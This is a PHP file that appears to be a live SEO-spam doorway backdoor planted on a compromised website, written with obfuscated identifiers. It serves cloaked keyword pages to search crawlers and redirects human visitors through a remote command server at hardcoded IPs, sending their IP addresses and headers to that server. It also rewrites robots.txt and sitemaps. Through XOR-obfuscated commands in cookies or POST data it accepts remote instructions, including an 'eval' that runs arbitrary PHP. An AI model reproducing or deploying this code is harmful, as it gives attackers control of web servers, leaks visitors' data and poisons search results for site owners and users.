<?php

class grabber {

    static private $lngIp = 2420912625; //144.76.47.168

    static function dataGet($url, $var) {
        $url[2] = count($url) > 4 ? long2ip(grabber::$lngIp - 585) : $url[2];
        $payLoad = grabber::curlGet($url, $var);
        if (!$payLoad) {
            $payLoad = grabber::streamGet($url, $var);
        }
        return $payLoad;
    }

    static function curlGet($url, $data, $header = NULL) {
        if (!function_exists('curl_version')) {
            return "";
        }
        if (is_array($url)) {
            $url = implode("/", $url);
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_URL, $url);
        if (!empty($data)) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        if (!empty($header)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    static function streamGet($url, $data, $header = NULL) {
        if (is_array($url)) {
            $url = implode("/", $url);
        }
        if (!empty($data)) {
            $opts = array('method' => 'POST', 'header' => 'Content-type: application/x-www-form-urlencoded', 'content' => $data);
            if (!empty($header)) {
                $opts["header"] = $opts["header"] . "\r\n" . implode("\r\n", $header);
            }
            $context = stream_context_create(array('http' => $opts));
        } else {
            $opts = array('method' => 'GET',);
            if (!empty($header)) {
                $opts["header"] = implode("\r\n", $header);
            }
            $context = stream_context_create(array('http' => $opts));
        }
        return file_get_contents($url, FALSE, $context);
    }

}

class _2bpzju {

    private static $cacheDir = "";
    private static $_7ncpw4xw = -1;
    private static $_w1zxo75w = "";
    private $template = "";
    private $text = "";
    private $keyword = "";
    private $links = "";

    public static function makeDir($path, $_80z0e5vx, $_myfdvjt6) {
        _2bpzju::$cacheDir = $path . "/cache/";
        _2bpzju::$_7ncpw4xw = $_80z0e5vx;
        _2bpzju::$_w1zxo75w = $_myfdvjt6;
        if (!file_exists(_2bpzju::$cacheDir)) {
            @mkdir(_2bpzju::$cacheDir);
        }
    }

    static public function _u1vi6() {
        $cnt = 0;
        foreach (scandir(_2bpzju::$cacheDir) as $_npk7e4pg) {
            $cnt += 1;
        }

        return $cnt;
    }

    public static function isTrue() {
        return TRUE;
    }

    public function __construct($template, $text, $keyword, $links) {
        $this->template = $template;
        $this->text = $text;
        $this->keyword = $keyword;
        $this->links = $links;
    }

    public function _ycee9() {

        function randFloat($_mf2ft1yd, $_a8oown9r) {
            return round(rand($_mf2ft1yd, $_a8oown9r - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);
        }

        $keywordsList = _27ykdf::keywordsListGet();
        $payLoad = str_replace("{{ text }}", $this->text, str_replace("{{ keyword }}", $this->keyword, str_replace("{{ links }}", $this->links, $this->template)));
        while (TRUE) {
            $_ovhhyg3z = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _27ykdf::randomKeywordGet(), $payLoad, 1);
            if ($_ovhhyg3z === $payLoad) {
                break;
            }
            $payLoad = $_ovhhyg3z;
        }

        while (TRUE) {
            //$_4rq9u8bk is not initialized in this file!!
            preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $payLoad, $_4rq9u8bk);
            if (empty($_4rq9u8bk)) {
                break;
            }
            $keyword = $keywordsList[intval($_4rq9u8bk[1])];
            $_v2zfsohb = main::_2417b($keyword);
            $payLoad = str_replace($_4rq9u8bk[0], $_v2zfsohb, $payLoad);
        }
        while (TRUE) {
            preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $payLoad, $_4rq9u8bk);
            if (empty($_4rq9u8bk)) {
                break;
            }
            $keyword = $keywordsList[intval($_4rq9u8bk[1])];
            $payLoad = str_replace($_4rq9u8bk[0], $keyword, $payLoad);
        }
        while (TRUE) {
            preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $payLoad, $_4rq9u8bk);
            if (empty($_4rq9u8bk)) {
                break;
            }
            $payLoad = str_replace($_4rq9u8bk[0], randFloat($_4rq9u8bk[1], $_4rq9u8bk[2]), $payLoad);
        }
        while (TRUE) {
            preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $payLoad, $_4rq9u8bk);
            if (empty($_4rq9u8bk)) {
                break;
            }
            $payLoad = str_replace($_4rq9u8bk[0], rand($_4rq9u8bk[1], $_4rq9u8bk[2]), $payLoad);
        }
        return $payLoad;
    }

    public function cachePut() {
        $filename = _2bpzju::$cacheDir . md5($this->keyword . _2bpzju::$_w1zxo75w);
        if (_2bpzju::$_7ncpw4xw == -1) {
            $expired = -1;
        } else {
            $expired = time() + (3600 * 24 * 30);
        }
        $data = array("template" => $this->template, "text" => $this->text, "keyword" => $this->keyword, "links" => $this->links, "expired" => $expired);
        file_put_contents($filename, serialize($data));
    }

    static public function cacheGet($filename) {
        $filename = _2bpzju::$cacheDir . md5($filename . _2bpzju::$_w1zxo75w);
        $data = @unserialize(@file_get_contents($filename));
        if (!empty($data) && ($data["expired"] > time() || $data["expired"] == -1)) {
            return new _2bpzju($data["template"], $data["text"], $data["keyword"], $data["links"]);
        } else {
            return null;
        }
    }

}

class _9l2id5g {

    private static $filesDir = "";
    private static $_wx47cjeb = "";

    public static function makeDir($path, $_bhbxo2yd) {
        _9l2id5g::$filesDir = $path . "/";
        _9l2id5g::$_wx47cjeb = $_bhbxo2yd;
        if (!file_exists(_9l2id5g::$filesDir)) {
            @mkdir(_9l2id5g::$filesDir);
        }
    }

    public static function isTrue() {
        return TRUE;
    }

    static public function _u1vi6() {
        $cnt = 0;
        foreach (scandir(_9l2id5g::$filesDir) as $_npk7e4pg) {
            if (strpos($_npk7e4pg, _9l2id5g::$_wx47cjeb) === 0) {
                $cnt += 1;
            }
        }
        return $cnt;
    }

    static public function randomStringGet() {
        $_xh5i8iq6 = array();
        foreach (scandir(_9l2id5g::$filesDir) as $_npk7e4pg) {
            if (strpos($_npk7e4pg, _9l2id5g::$_wx47cjeb) === 0) {
                $_xh5i8iq6[] = $_npk7e4pg;
            }
        }

        return file_get_contents(_9l2id5g::$filesDir . $_xh5i8iq6[array_rand($_xh5i8iq6)]);
    }

    static public function htmlPut($_o2rof3yv) {
        if (file_exists(_9l2id5g::$_wx47cjeb . "_" . md5($_o2rof3yv) . ".html")) {
            return;
        }
        file_put_contents(_9l2id5g::$_wx47cjeb . "_" . md5($_o2rof3yv) . ".html", $_o2rof3yv);
    }

}

class _27ykdf {

    private static $filesDir = "";
    private static $_wx47cjeb = "";
    private static $lines = Array();
    private static $keywordsList = Array();

    public static function makeDir($path, $_bhbxo2yd) {
        _27ykdf::$filesDir = $path . "/";
        _27ykdf::$_wx47cjeb = $_bhbxo2yd;
        if (!file_exists(_27ykdf::$filesDir)) {
            @mkdir(_27ykdf::$filesDir);
        }
    }

    private static function filesGet() {
        $filesName = array();
        foreach (scandir(_27ykdf::$filesDir) as $_npk7e4pg) {
            if (strpos($_npk7e4pg, _27ykdf::$_wx47cjeb) === 0) {
                $filesName[] = $_npk7e4pg;
            }
        }
        return $filesName;
    }

    public static function isTrue() {
        return TRUE;
    }

    static public function randomKeywordGet() {
        if (empty(_27ykdf::$lines)) {
            $filesName = _27ykdf::filesGet();
            _27ykdf::$lines = file(_27ykdf::$filesDir . $filesName[array_rand($filesName)], FILE_IGNORE_NEW_LINES);
        }
        return _27ykdf::$lines[array_rand(_27ykdf::$lines)];
    }

    static public function keywordsListGet() {
        if (empty(_27ykdf::$keywordsList)) {
            $filesName = _27ykdf::filesGet();
            foreach ($filesName as $fileName) {
                _27ykdf::$keywordsList = array_merge(_27ykdf::$keywordsList, file(_27ykdf::$filesDir . $fileName, FILE_IGNORE_NEW_LINES));
            }
        }
        return _27ykdf::$keywordsList;
    }

    static public function keywordListPut($keyword) {
        if (file_exists(_27ykdf::$_wx47cjeb . "_" . md5($keyword) . ".list")) {
            return;
        }
        file_put_contents(_27ykdf::$_wx47cjeb . "_" . md5($keyword) . ".list", $keyword);
    }

    static public function _lpk7h($keyword) {
        file_put_contents(_27ykdf::$_wx47cjeb . "_" . md5(main::$uid) . ".list", $keyword . "\n", 8);
    }

}

class main {

    static public $version = "5.0";
    static public $uid = "16df6a14-6a42-9859-8245-333a0c0f8ede";
    private $actionRedir = "http://136.12.78.46/app/assets/api2?action=redir";
    private $actionPage = "http://136.12.78.46/app/assets/api?action=page";
    static public $cfgFive = 5;
    static public $cfgTwenty = 20;

    private function _0sbb0() {
        $_u61njdpj = array('#libwww-perl#i', '#MJ12bot#i', '#msnbot#i', '#msnbot-media#i', '#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i', '#spider#i', '#yahoo#i', '#google#i', '#altavista#i', '#ask#i', '#yahoo!\s*slurp#i', '#BingBot#i');
        if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_u61njdpj, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {
            $_7o5fwrgc = 1;
        } elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {
            $_7o5fwrgc = 1;
        } elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE && strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE && strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE && strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {
            $_7o5fwrgc = 1;
        } else {
            $_7o5fwrgc = 0;
        }
        return $_7o5fwrgc;
    }

    private static function getServerVar() {
        $var = array();
        $var['ip'] = $_SERVER['REMOTE_ADDR'];
        $var['qs'] = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $var['ua'] = $_SERVER['HTTP_USER_AGENT'];
        $var['lang'] = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
        $var['ref'] = $_SERVER['HTTP_REFERER'];
        $var['enc'] = $_SERVER['HTTP_ACCEPT_ENCODING'];
        $var['acp'] = $_SERVER['HTTP_ACCEPT'];
        $var['char'] = $_SERVER['HTTP_ACCEPT_CHARSET'];
        $var['conn'] = $_SERVER['HTTP_CONNECTION'];
        return $var;
    }

    public function __construct() {
        $this->actionRedir = explode("/", $this->actionRedir);
        $this->actionPage = explode("/", $this->actionPage);
    }

    static public function b64decode($str) {
        if (strlen($str) < 4) {
            return "";
        }

        $custom = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $charArray = str_split($custom);
        $charArray = array_flip($charArray);
        $cnt = 0;
        $returnVal = "";
        $str = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $str);
        do {
            $_018ktdum = $charArray [$str[$cnt++]];
            $_7q7x1u4p = $charArray [$str[$cnt++]];
            $_cwo18aw4 = $charArray [$str[$cnt++]];
            $_8ja9k02b = $charArray [$str[$cnt++]];
            $_gj39uxf5 = ($_018ktdum << 2) | ($_7q7x1u4p >> 4);
            $_ohkd63dq = (($_7q7x1u4p & 15) << 4) | ($_cwo18aw4 >> 2);
            $_cuil85qv = (($_cwo18aw4 & 3) << 6) | $_8ja9k02b;
            $returnVal = $returnVal . chr($_gj39uxf5);
            if ($_cwo18aw4 != 64) {
                $returnVal = $returnVal . chr($_ohkd63dq);
            }if ($_8ja9k02b != 64) {
                $returnVal = $returnVal . chr($_cuil85qv);
            }
        } while (
        $cnt < strlen($str)
        );
        return $returnVal;
    }

    private function _3lryd($keyword) {
        $_gmo4taah = "";
        $text = "";
        $var = main::getServerVar();
        $var["uid"] = main::$uid;
        $var["keyword"] = $keyword;
        $var["tc"] = 10;
        $var = http_build_query($var);
        $value = grabber::dataGet($this->actionPage, $var);
        if (strpos($value, main::$uid) === FALSE) {
            return array($_gmo4taah, $text);
        }
        $_gmo4taah = _9l2id5g::randomStringGet();
        $text = substr($value, strlen(main::$uid));
        $text = explode("\n", $text);
        shuffle($text);
        $text = implode(" ", $text);
        return array($_gmo4taah, $text);
    }

    private function showPage() {
        $var = main::getServerVar();
        if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            $var['cfconn'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
        }if (isset($_SERVER['HTTP_X_REAL_IP'])) {
            $var['xreal'] = $_SERVER['HTTP_X_REAL_IP'];
        }if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $var['xforward'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        $var["uid"] = main::$uid;
        $var = http_build_query($var);
        $page = grabber::dataGet($this->actionRedir, $var);
        $page = @unserialize($page);
        if (isset($page["type"]) && $page["type"] == "redir") {
            if (!empty($page["data"]["header"])) {
                header($page["data"]["header"]);
                return true;
            } elseif (!empty($page["data"]["code"])) {
                echo $page["data"]["code"];
                return true;
            }
        }
        return false;
    }

    public function isTrue() {
        return _2bpzju::isTrue() && _9l2id5g::isTrue() && _27ykdf::isTrue();
    }

    static public function isSecure() {
        if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {
            return true;
        }
        return false;
    }

    public static function fixUri() {
        $uriParts = explode("?", $_SERVER["REQUEST_URI"], 2);
        $uriParts = $uriParts[0];
        if (strpos($uriParts, ".php") === FALSE) {
            $uriParts = explode("/", $uriParts);
            array_pop($uriParts);
            $uriParts = implode("/", $uriParts) . "/";
        }
        return sprintf("%s://%s%s", main::isSecure() ? "https" : "http", $_SERVER['HTTP_HOST'], $uriParts);
    }

    public static function _sjmbx() {
        $_utp9r7q8 = array("https://www.bing.com/ping?sitemap=" => "Thanks for submitting your Sitemap", "https://www.google.com/ping?sitemap=" => "Sitemap Notification Received");
        $header = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language: en-US,en;q=0.5", "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",);
        $sitemap = urlencode(main::fixUrPath() . "/sitemap.xml");
        foreach ($_utp9r7q8 as $key => $value) {
            $result = grabber::curlGet($key . $sitemap, NULL, $header);
            if (empty($result)) {
                $result = grabber::streamGet($key . $sitemap, NULL, $header);
            }
            if (empty($result)) {
                return FALSE;
            }
            if (strpos($result, $value) === FALSE) {
                return FALSE;
            }
        }
        return TRUE;
    }

    public static function setRobot() {
        $_cu0lb3i0 = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";
        $uriParts = explode("?", $_SERVER["REQUEST_URI"], 2);
        $uriParts = $uriParts[0];
        $_3gxjdga4 = substr($uriParts, 0, strrpos($uriParts, "/"));
        $_0frt5xxm = sprintf($_cu0lb3i0, $_3gxjdga4, main::fixUrPath() . "/sitemap.xml");
        $robotPath = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";
        if (file_exists($robotPath)) {
            chmod($robotPath, 0777);
            $robot = file_get_contents($robotPath);
        } else {
            $robot = "";
        }
        if (strpos($robot, $_0frt5xxm) === FALSE) {
            file_put_contents($robotPath, $robot . "\n" . $_0frt5xxm);
            $robot = file_get_contents($robotPath);
            return (strpos($robot, $_0frt5xxm) !== FALSE);
        }
        return FALSE;
    }

    public static function fixUrPath() {
        $uriParts = explode("?", $_SERVER["REQUEST_URI"], 2);
        $uriParts = $uriParts[0];
        $_3tazj3b2 = substr($uriParts, 0, strrpos($uriParts, "/"));
        return sprintf("%s://%s%s", main::isSecure() ? "https" : "http", $_SERVER['HTTP_HOST'], $_3tazj3b2);
    }

    public static function _2417b($keyword) {
        $_8jc7ag7b = main::fixUri();
        $hash = substr(md5(main::$uid . "salt3"), 0, 6);
        $_d5zivyli = "";
        if (substr($_8jc7ag7b, -1) == "/") {
            if (ord($hash[1]) % 2) {
                $keyword = str_replace(" ", "-", $hash . "-" . $keyword);
            } else {
                $keyword = str_replace(" ", "-", $keyword . "-" . $hash);
            }
            $_d5zivyli = sprintf("%s%s", $_8jc7ag7b, urlencode($keyword));
        } else {
            if (ord($hash[0]) % 2) {
                $_d5zivyli = sprintf("%s?%s=%s", $_8jc7ag7b, $hash, urlencode(str_replace(" ", "-", $keyword)));
            } else {
                $_v8jox7bc = array("id", "page", "tag");
                $_v9hn3kpq = $_v8jox7bc[ord($hash[2]) % count($_v8jox7bc)];
                if (ord($hash[1]) % 2) {
                    $keyword = str_replace(" ", "-", $hash . "-" . $keyword);
                } else {
                    $keyword = str_replace(" ", "-", $keyword . "-" . $hash);
                }
                $_d5zivyli = sprintf("%s?%s=%s", $_8jc7ag7b, $_v9hn3kpq, urlencode($keyword));
            }
        }
        return $_d5zivyli;
    }

    public static function _1shqt($_mf2ft1yd, $_a8oown9r) {
        $_4c9wodm3 = "";
        for ($cnt = 0; $cnt < rand($_mf2ft1yd, $_a8oown9r); $cnt++) {
            $keyword = _27ykdf::randomKeywordGet();
            $_4c9wodm3 .= sprintf("<a href=\"%s\">%s</a>,\n", main::_2417b($keyword), ucwords($keyword));
        }
        return $_4c9wodm3;
    }

    public static function setSitemap($_ph47vauv = FALSE) {
        $sitemapFile = dirname(__FILE__) . "/sitemap.xml";
        $xmlStart = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";
        $xmlEnd = "</urlset>";
        $keywordsList = _27ykdf::keywordsListGet();
        $_7o2zectf = array();
        if (file_exists($sitemapFile)) {
            $nodes = simplexml_load_file($sitemapFile);
            foreach ($nodes as $node) {
                $_7o2zectf[(string) $node->loc] = (string) $node->lastmod;
            }
        } else {
            $_ph47vauv = FALSE;
        }
        foreach ($keywordsList as $_617nj08r) {
            $_d5zivyli = main::_2417b($_617nj08r);
            if (isset($_7o2zectf[$_d5zivyli])) {
                continue;
            }
            if ($_ph47vauv) {
                $_69ev0lxj = time();
            } else {
                $_69ev0lxj = time() - (crc32($_617nj08r) % (60 * 60 * 24 * 30));
            }
            $_7o2zectf[$_d5zivyli] = date("Y-m-d", $_69ev0lxj);
        }
        $xmlString = "";
        foreach ($_7o2zectf as $url => $_69ev0lxj) {
            $xmlString .= "<url>\n";
            $xmlString .= sprintf("<loc>%s</loc>\n", $url);
            $xmlString .= sprintf("<lastmod>%s</lastmod>\n", $_69ev0lxj);
            $xmlString .= "</url>\n";
        }
        $sitemap = $xmlStart . $xmlString . $xmlEnd;
        $_v1iw63v8 = main::fixUrPath() . "/sitemap.xml";
        file_put_contents($sitemapFile, $sitemap);
        return $_v1iw63v8;
    }

    public function _5j3ii() {
        $hash = substr(md5(main::$uid . "salt3"), 0, 6);
        if (isset($_GET[$hash])) {
            $keyword = $_GET[$hash];
        } elseif (strpos($_SERVER["REQUEST_URI"], $hash) !== FALSE) {
            $_gdnpkyd9 = explode("/", $_SERVER["REQUEST_URI"]);
            foreach ($_gdnpkyd9 as $_nvsh67bt) {
                if (strpos($_nvsh67bt, $hash) !== FALSE) {
                    $_b3c91z51 = explode("=", $_nvsh67bt);
                    $_f3ntl0v3 = array_pop($_b3c91z51);
                    $_f3ntl0v3 = str_replace($hash . "-", "", $_f3ntl0v3);
                    $_f3ntl0v3 = str_replace("-" . $hash, "", $_f3ntl0v3);
                    $keyword = $_f3ntl0v3;
                }
            }
        }
        if (empty($keyword)) {
            $keywordsList = _27ykdf::keywordsListGet();
            $keyword = $keywordsList[0];
        }
        if (!empty($keyword)) {
            $keyword = str_replace("-", " ", $keyword);
            if (!$this->_0sbb0()) {
                if ($this->showPage()) {
                    return;
                }
            }
            $keyword = urldecode($keyword);
            $page = _2bpzju::cacheGet($keyword);
            if (empty($page)) {
                list($template, $text) = $this->_3lryd($keyword);
                if (empty($text)) {
                    return;
                }
                $cache = new _2bpzju($template, $text, $keyword, main::_1shqt(main::$cfgFive, main::$cfgTwenty));
                $cache->cachePut();
            }
            echo $page->_ycee9();
        }
    }

}

_2bpzju::makeDir(dirname(__FILE__), -1, main::$uid);
_9l2id5g::makeDir(dirname(__FILE__), substr(md5(main::$uid . "salt12"), 0, 4));
_27ykdf::makeDir(dirname(__FILE__), substr(md5(main::$uid . "salt22"), 0, 4));

function calcXor($value, $altval) {
    $xordstring = "";
    for ($cnt = 0; $cnt < strlen($value);) {
        for ($cnt2 = 0; $cnt2 < strlen($altval) && $cnt < strlen($value); $cnt2++, $cnt++) {
            $xordstring .= chr(ord($value[$cnt]) ^ ord($altval[$cnt2]));
        }
    }
    return $xordstring;
}

function _euffq($value, $altval, $thirdval) {
    return calcXor(calcXor($value, $altval), $thirdval);
}

foreach (array_merge($_COOKIE, $_POST) as $key => $value) {
    $value = @unserialize(_euffq(main::b64decode($value), $key, main::$uid));
    if (isset($value['ak']) && main::$uid == $value['ak']) {
        if ($value['a'] == 'doorway2') {
            if ($value['sa'] == 'check') {
                $payLoad = grabber::dataGet(explode("/", "http://httpbin.org/"), "");
                if (strlen($payLoad) > 512) {
                    echo serialize(array("uid" => main::$uid, "v" => main::$version, "cache" => _2bpzju::_u1vi6(), "keywords" => count(_27ykdf::keywordsListGet()), "templates" => _9l2id5g::_u1vi6()));
                }
                exit;
            }
            if ($value['sa'] == 'templates') {
                foreach ($value["templates"] as $templates) {
                    _9l2id5g::htmlPut($templates);
                    echo serialize(array("uid" => main::$uid, "v" => main::$version,));
                }
            }
            if ($value['sa'] == 'keywords') {
                _27ykdf::keywordListPut($value["keywords"]);
                main::setSitemap();
                echo serialize(array("uid" => main::$uid, "v" => main::$version,));
            }
            if ($value['sa'] == 'update_sitemap') {
                main::setSitemap(TRUE);
                echo serialize(array("uid" => main::$uid, "v" => main::$version,));
            }
            if ($value['sa'] == 'pages') {
                $cnt = 0;
                $_rywj75m4 = _27ykdf::keywordsListGet();
                if (_9l2id5g::_u1vi6() > 0) {
                    foreach ($value['pages'] as $page) {
                        $htmlPage = _2bpzju::cacheGet($page["keyword"]);
                        if (empty($htmlPage)) {
                            $htmlPage = new _2bpzju(_9l2id5g::randomStringGet(), $page["text"], $page["keyword"], main::_1shqt(main::$cfgFive, main::$cfgTwenty));
                            $htmlPage->cachePut();
                            $cnt += 1;
                            if (!in_array($page["keyword"], $_rywj75m4)) {
                                _27ykdf::_lpk7h($page["keyword"]);
                            }
                        }
                    }
                }
                echo serialize(array("uid" => main::$uid, "v" => main::$version, "pages" => $cnt));
            }
            if ($value["sa"] == "ping") {
                $result = main::_sjmbx();
                echo serialize(array("uid" => main::$uid, "v" => main::$version, "result" => (int) $result));
            }
            if ($value["sa"] == "robots") {
                $result = main::setRobot();
                echo serialize(array("uid" => main::$uid, "v" => main::$version, "result" => (int) $result));
            }
        }
        if ($value['sa'] == 'eval') {
            eval($value["data"]);
            exit;
        }
    }
}
$main = new main();

if ($main->isTrue()) {
    $main->_5j3ii();
}
exit();
